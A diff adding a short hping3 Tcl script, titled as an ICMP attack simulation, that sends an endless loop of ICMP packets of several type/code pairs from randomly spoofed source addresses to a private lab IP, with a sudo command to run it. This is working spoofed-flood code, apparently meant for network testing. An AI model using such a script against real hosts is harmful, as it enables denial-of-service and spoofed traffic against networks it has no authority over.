@@ -1,0 +1,35 @@
+# hping3_icmp_sequential.htcl
+# Sequential ICMP attack simulation with spoofed source IP
+
+set dst_ip "192.168.100.2"
+
+# Random spoof IP generator
+proc random_ip {} {
+    return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
+}
+
+# Lista das sequências:
+# {type code}
+set sequence {
+    {8 0}
+    {0 0}
+    {3 1}
+    {3 0}
+}
+
+# Loop infinito enviando cada tipo/código em ordem
+while {1} {
+    foreach pair $sequence {
+        set type [lindex $pair 0]
+        set code [lindex $pair 1]
+        set saddr [random_ip]
+
+        # Monta o pacote APD
+        set pkt "ip(saddr=$saddr,daddr=$dst_ip)+icmp(type=$type,code=$code)"
+
+        # Envia
+        hping send $pkt
+    }
+}
+
+# sudo hping3 exec icmp_sequential_type_code.htcl
